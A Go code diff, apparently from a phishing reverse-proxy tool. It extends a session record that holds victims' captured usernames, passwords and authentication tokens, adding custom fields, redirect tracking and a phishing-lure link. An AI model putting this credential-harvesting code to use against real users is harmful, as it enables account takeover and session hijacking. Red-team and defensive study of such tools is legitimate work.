@@ -5,23 +5,31 @@ import (
 )
 
 type Session struct {
-	Id          string
-	Name        string
-	Username    string
-	Password    string
-	Tokens      map[string]map[string]*database.Token
-	RedirectURL string
-	IsDone      bool
+	Id            string
+	Name          string
+	Username      string
+	Password      string
+	Custom        map[string]string
+	Tokens        map[string]map[string]*database.Token
+	RedirectURL   string
+	IsDone        bool
+	IsAuthUrl     bool
+	RedirectCount int
+	PhishLure     *Lure
 }
 
 func NewSession(name string) (*Session, error) {
 	s := &Session{
-		Id:          GenRandomToken(),
-		Name:        name,
-		Username:    "",
-		Password:    "",
-		RedirectURL: "",
-		IsDone:      false,
+		Id:            GenRandomToken(),
+		Name:          name,
+		Username:      "",
+		Password:      "",
+		Custom:        make(map[string]string),
+		RedirectURL:   "",
+		IsDone:        false,
+		IsAuthUrl:     false,
+		RedirectCount: 0,
+		PhishLure:     nil,
 	}
 	s.Tokens = make(map[string]map[string]*database.Token)
 
@@ -34,6 +42,10 @@ func (s *Session) SetUsername(username string) {
 
 func (s *Session) SetPassword(password string) {
 	s.Password = password
+}
+
+func (s *Session) SetCustom(name string, value string) {
+	s.Custom[name] = value
 }
 
 func (s *Session) AddAuthToken(domain string, key string, value string, path string, http_only bool, authTokens map[string][]*AuthToken) bool {
@@ -57,7 +69,9 @@ func (s *Session) AddAuthToken(domain string, key string, value string, path str
 	for k, v := range authTokens {
 		tcopy[k] = []AuthToken{}
 		for _, at := range v {
-			tcopy[k] = append(tcopy[k], *at)
+			if !at.optional {
+				tcopy[k] = append(tcopy[k], *at)
+			}
 		}
 	}
 
